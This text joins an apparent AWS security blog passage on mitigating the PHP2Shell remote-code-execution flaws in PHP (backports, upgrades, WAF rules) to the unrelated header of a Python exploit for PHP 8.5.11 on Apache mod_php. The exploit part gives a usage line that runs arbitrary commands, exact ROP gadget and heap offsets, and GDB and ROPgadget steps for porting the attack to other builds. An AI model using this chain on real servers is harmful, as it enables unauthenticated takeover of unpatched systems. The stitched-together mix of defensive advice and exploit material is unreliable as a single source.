PHP 8.1 and earlier no longer receive updates from the PHP project. Which option you have depends on your version and how you install PHP:

Use a vendor backport. Some Linux distributions and long-term support (LTS) vendors provide backported fixes for older branches. Check with your vendor.

Apply the PHP source backports for PHP 7.4, 8.0, or 8.1. Because of the severity of these vulnerabilities, the PHP security team published minimal source backports for these three branches, for people who build PHP from source or don’t have an LTS vendor. Rebuild PHP with the backport, deploy it, and restart every PHP worker. For details, see the PHP security advisory.

Upgrade to a supported release. This is the long-term fix. It’s also the only option for PHP 7.3 and earlier if your vendor doesn’t provide a backport.

A backport fixes these vulnerabilities, but the branch is still end of life and won’t get other security fixes. Treat a backport as a bridge to an upgrade, not a replacement for one. When you upgrade, target PHP 8.3 or later, because PHP 8.2 reaches end of life on December 31, 2026.

For many applications, the upgrade takes code changes as well as a runtime change. Later PHP versions removed language features and extensions that older code often depends on. Plan the upgrade as follows:

Identify each application on PHP 8.1 or earlier, and the frameworks and Composer dependencies it uses.

Review the PHP migration guides for each version between your current release and the target. Update the code, dependencies, and framework versions to match.

Run your tests and static analysis against the target version before you deploy.

Deploy on a fixed release and restart every PHP worker.

One option for implementing the code changes is the AWS Transform PHP version upgrade transformation (AWS/php-version-upgrade, in early access). It upgrades applications from PHP 5.x, 7.x, or 8.0 through 8.4 to PHP 8.5, and it runs your existing tests and static analysis before and after the upgrade. For details, see AWS-managed transformations, or contact your AWS account team.

Until each workload runs a fixed release or a backport, keep the AWS WAF rules and server-side mitigations in this post in place. They reduce exposure, but they don’t fix the vulnerabilities.

Getting started

Complete the following steps to get started:

Inventory where PHP runs and which versions and server APIs (mod_php, FPM, FrankenPHP, LSAPI) are in use. Identify any public endpoint that accepts a request body.

Identify workloads on PHP 8.1 or earlier. Apply a vendor backport or the PHP source backport where one exists, and start the upgrade to a supported release, because it can take longer than a runtime patch. See Fix end-of-life PHP versions.

Check the web ACL in front of each PHP workload. If it uses the PHP application rule group at the default version, PHP2Shell_BODY and PHP2Shell_BODY_Extended are already active. If it pins a static version, change it to Version_2.4 or later, or remove the Version field to use the default version.

Add the PHP application rule group and the Core rule set where they’re missing. Then decide whether each application uses multipart uploads, which determines whether you can add the rule that blocks multipart requests.

Add the applicable custom rules in Count mode. Raise the body inspection limit on CloudFront or API Gateway if a rule needs it.

Watch the sampled requests and Amazon CloudWatch metrics for each rule. Confirm that legitimate uploads and large JSON POSTs aren’t matched.

Switch the rules to Block after the metrics are clean. Test the custom rules with a benign multipart/form-data POST, an oversized body, and a POST request that has a PHPSESSID cookie and PHP_SESSION_UPLOAD_PROGRESS in the body. After you switch to Block, expect a 403 response and the matching rule metric.

In parallel, apply the PHP upgrade and the configuration mitigations. Remove or retain the AWS WAF rules as supporting controls after your fleet is patched.

Conclusion

The PHP2Shell vulnerabilities—CVE-2026-109618 and CVE-2026-109619—are unauthenticated RCE vulnerabilities that reach PHP before your application code runs. AWS WAF gives you a way to help narrow the attack surface during the patch window. Turn on the PHP application managed rule group at the default version (or version 2.4 or later if you pin) and the Core rule set. Then add the custom controls that fit your application: block multipart requests where no uploads are expected, cap request body size, and rate-limit repeated attempts. These mitigating controls can help reduce exposure, but they don’t close the vulnerabilities. If you run PHP 8.1 or earlier, apply a backport where one is available and plan your upgrade to a supported release. If you run PHP 8.2 or later then upgrade PHP to a fixed release, apply the server configuration changes (including session.upload_progress.enabled=0, which also covers CVE-2026-115560 until PHP releases a fix), and treat AWS WAF as the edge layer that supports those fixes rather than the fix itself.

To learn more, see the PHP application managed rule group and the AWS Managed Rules changelog, managed rule group versioning, the web ACL body inspection limit, oversize request component handling, and the AWS re:Post article on handling oversize HTTP request bodies. For tuning and exceptions, see the AWS WAF best practices guide. For the vulnerability details, see the PHP advisories GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp, and the PHP session upload progress manual.

AWS thanks Wiz for reporting the PHP2Shell issues, CVE-2026-109618 and CVE-2026-109619, to AWS through coordinated disclosure ahead of their public release. Wiz shared its findings with AWS ahead of publicly disclosing. Using Wiz’s findings, AWS developed and tested AWS WAF managed rules that provide an additional layer of protection for customers who use PHP-based workloads.

AWS values its collaboration with Wiz and the broader security research community. Coordinated disclosure of this kind allows AWS to better prepare protections to help customers in advance of a public disclosure.

articles.full_text:
#!/usr/bin/env python3 """PHP2Shell RCE chain for PHP 8.5.11 apache/mod_php. Usage: python3 exploit.py --host TARGET --rce 'id>/var/www/html/proof.txt' Purpose and vulnerability mechanisms ==================================== This is a pure-HTTP, application-independent research exploit for an isolated lab. Its default endpoint is ``/index.php`` and is configurable with ``--path``. With no ``--rce`` it stops after reproducing the overlong ``Set-Cookie`` disclosure. With ``--rce [COMMAND]`` it composes two distinct PHP memory-safety mechanisms. Bare ``--rce`` runs the documented default and verifies ``/proof.txt``; a custom command is delivered without claiming that its execution was verified. 1. The A1/B1 disclosure is derived from 9bie's cross-request session-state chain. An upload-progress request reaches an OOM bailout before request state is safely reset; a later request in the *same mod_php child* consumes the stale ``PS(id)`` and encodes an attacker-forged ``zend_string`` into the session cookie. This is strongest-fit **CVE-2026-109619** behavior: request- owned session globals outlive their backing request heap. OOM is the producer, but the security boundary crossed by this stage is request lifetime. This is mechanism-based attribution, not a CNA reassignment of any individual public PoC. 2. The optional final sink is adapted from Cookiengineer's OOM RCE. Multipart amplification exhausts the stock 128 MiB heap while ``_zend_hash_str_add_or_update_i()`` has counted but not initialized its final ``HashTable`` bucket. Same-request shutdown walks the incomplete bucket into a forged object, a libphp-only ``jump_fcontext`` ROP chain, and ``zif_system``. This is the incomplete-state/cleanup mechanism of **CVE-2026-109618**. Worker discovery, chunked transfer, prefork saturation, the full-pool scrub, and the clean holder rebind are delivery/affinity techniques, not additional CVEs. The scrub exists because the validated Apache environment can retain children already marked for graceful retirement when its IPv6 listener wakeup fails; without it, a second invocation may place A1 and B1 in different processes. The post-scrub repin is concurrent so VPN latency cannot recreate an idle-surplus window. Debugger mappings were used only to calibrate and independently verify the constants below; successful end-to-end runs derive their live bases from the HTTP cookie. Validated exact environment (2026-10-23) ======================================== This profile is intentionally build-specific. Recalibrate all offsets and heap geometry for any other binary, compiler flags, module set, architecture, or loader layout. * PHP 8.5.11 NTS, Zend Engine 4.5.11, source tag ``php-8.5.11``: annotated tag object ``597eb0b4e32cc8802e112fe13cc92fb5636a1781``; peeled source commit ``678778973bb4d4185c06ef1320de50f1a975d3c8``. * Official ``php-8.5.11.tar.xz`` SHA-256: ``d9be75c08e8c316f4c8f4194d8fbe1750a15f6a6d9d4e3fe72082abeeb800360``. * Source build flags: ``-O2 -g -fno-omit-frame-pointer -fcf-protection=none``; Apache 2.4.66 (Ubuntu) ``mod_php``/prefork on x86-64; glibc 2.43 (Ubuntu ``2.43-2ubuntu2.4``); validation kernel ``Linux 7.0.0-38-generic``. * ``/usr/lib/apache2/modules/libphp.so`` SHA-256: ``ecd97e302e8cb3fd106c0541410256ad6597cb6410166beee0ab773ff4974b36``; GNU Build ID ``c01226a7f67b3226c1d2f81f4fc5041846914117``. * ASLR enabled (``kernel.randomize_va_space=2``), Apache defaults including ``StartServers=5`` and ``MaxRequestWorkers=150``, and unmodified upstream ``php.ini-production``: ``memory_limit=128M``, ``post_max_size=8M``, ``upload_max_filesize=2M``, ``max_file_uploads=20``, ``max_input_vars=1000``, ``max_input_nesting_level=64``, error display off, logging on, and session upload progress plus cleanup enabled. * Exact module offsets: ``zval_ptr_dtor=0x7ae960``, ``zif_system=0x598650``, ``jump_fcontext+0x2e=0x6362ae``, ``pop rdi; ret=0x280d8d``, ``pop rsi; ret=0x2cbe07``, and alignment ``ret=0x280d8e``. * Exact heap/layout constants: Zend main chunk ``libphp+0x3400000``; post-disclosure controlled block ``main+0x5c400``; stale-ID forge page ``0x1e3``; 402,500 duplicate multipart headers for the stock-128M sink. * The combined upstream fix used for source comparison is php-src commit ``506e87fa7dcdd306975e5b8f8265ee03527aacbf`` ("Avoid state corruption via bailout"), released in the patched 8.5.12/8.4.27/8.3.30/8.2.29 lines. Recalibrating a different build =============================== Never transplant the constants above based only on ``PHP_VERSION``. Preserve the candidate module first, record its identity, and do all debugger work in an isolated copy of the target environment. For example:: LIBPHP=/usr/lib/apache2/modules/libphp.so sha256sum "$LIBPHP" readelf -n "$LIBPHP" | grep 'Build ID' readelf -lW "$LIBPHP" # record executable PT_LOAD ranges nm -an "$LIBPHP" | grep -wE 'zval_ptr_dtor|zif_system|jump_fcontext' ``nm`` values are image-relative because this module is ET_DYN. The pivot is ``jump_fcontext+0x2e`` only after disassembly confirms the same instruction sequence. Find and inspect ROP gadgets rather than copying byte offsets:: ROPgadget --binary "$LIBPHP" --only 'pop|ret' | \ grep -E 'pop rdi ; ret$|pop rsi ; ret$|: ret$' objdump -d -M intel "$LIBPHP" | less Verify every chosen gadget lies in an executable ``PT_LOAD`` and inspect its surrounding instructions. If normal symbols are stripped, use the matching debug file/build ID with ``readelf -Ws`` or GDB; do not derive offsets from a different package that merely reports the same PHP version. To recalibrate the disclosure, run a fresh debug child with the same INI and modules, pause the selected rebound worker, map its client port to a PID with ``ss -tnp``, and attach GDB. A convenient driver form is:: python3 exploit.py --host TARGET --port 80 --path /index.php \ --pause-after-rebind 60 # Read new_port from the log on the target, then: ss -tnp sport = :80 dport = :NEW_PORT gdb -q -p CHILD_PID (gdb) break php_url_encode (gdb) continue (gdb) p/x ps_globals.id (gdb) p/x ((unsigned long)ps_globals.id & 0x1fffff) >> 12 (gdb) p ps_globals.send_cookie The second GDB expression is the ID page; use it as ``--forge-page``. Sweep the A1 query/burner/progress lengths and B1 ``G``/``X`` geometry until GDB shows OOM in ``php_url_encode()``, ``PS(send_cookie)=1``, and the B1 cookie contains a highly repeated pointer that resolves exactly to the new ``zval_ptr_dtor``. Confirm the derived module base against mappings only *after* the HTTP result; mappings must never be an exploit input. Measure the module-to-main-chunk delta in several fresh ASLR parent lifetimes. With symbols loaded in GDB, compute the module base from a known symbol and align the Zend heap pointer to its 2 MiB chunk:: set $libphp = (unsigned long)&zval_ptr_dtor - NEW_DTOR_OFFSET set $main = (unsigned long)alloc_globals.mm_heap & ~0x1fffffUL p/x $libphp p/x $main p/x $main - $libphp Accept the delta only if it repeats for independently started Apache parents and the leaked cookie contains pointers in the derived main-chunk bucket. Finally recalibrate the 109618 sink *after the complete A1/B1 history*, not on a virgin worker. Use ``--pause-before-rce``, attach the selected debug child, and break on ``zend_mm_safe_error``, ``_zend_hash_str_add_or_update_i``, and ``zend_array_destroy``, and identify the shutdown table with ``nNumUsed=46``. For this payload layout the controlled block is ``arData-0x200``; subtract the aligned main-chunk base to obtain ``--rce-block-offset``. Sweep ``--rce-headers`` around the OOM boundary until the failed allocation is the 80,000-byte key's 81,920-byte allocation and the incomplete bucket contains the forged object. Recheck the pivot, fake handlers, ROP registers, and entry to ``zif_system`` in GDB, then validate without a debugger using a fresh, unique proof name. Repeat under a new ASLR parent and run twice without an Apache restart before treating the profile as usable. Direct lineage and credits ========================== Credit belongs to the original researchers and repositories. This local composition, retuning, worker scrub, and validation do not replace their copyright or licensing terms. * **9bie**, ``php2shell-bypass-aslr-exp`` commit ``17e98ee81025cccfd94b4f9c9a17bf269c65ff75``: A1/B1 session-state OOM, forged-cookie disclosure geometry, worker occupancy, and the original ASLR-on chain. The local 8.5.11 port widens its overly narrow ``0x7f`` pointer floor and retunes the heap geometry. * **dinosn**, ``php-cve-2026-10961x-lab-poc`` commit ``b1e419912219691417c72b122f6eb410b938eee7``: instrumented CVE controls, Ninebie-class porting, stock-configuration experiments, offset/profile work, and worker-saturation research used as comparison and calibration guidance. * **Cookiengineer**, ``actual-php2shell`` commit ``1d5208ba5090cbbc56a091f6607996c3bbb21171``: the independently validated CVE-2026-109618 incomplete-bucket/object-destruction RCE sink. The local adapter amplifies it to 128 MiB and replaces libc-dependent ROP with gadgets and ``zif_system`` from this exact libphp image. Other reviewed/referenced public PoCs (not direct code lineage for this file) are credited to **Eness** (``php2shell-CVE-2026-109618-CVE-2026-109619-PoC``, ``df8b16fe69ab7218f496b5d88127253fc90ff92e``), **0x4148** (``CVE-2026-109618-php2shell-lab``, ``bc40fb2c96d5e92121e6bf8b996f7ba3ad057413``), **Ikow** (``php2shell-poc``, ``31519e6d8a84dee1df1262961ed1bebb65accadd``), **Murrez** (``php2shell``, ``e62535936b5fb1d013f8f52832df8c740c88e672``), and **Syrex1013** (``php2shell``, ``2b14725288c519380810fb057b214889eea9ee76``).
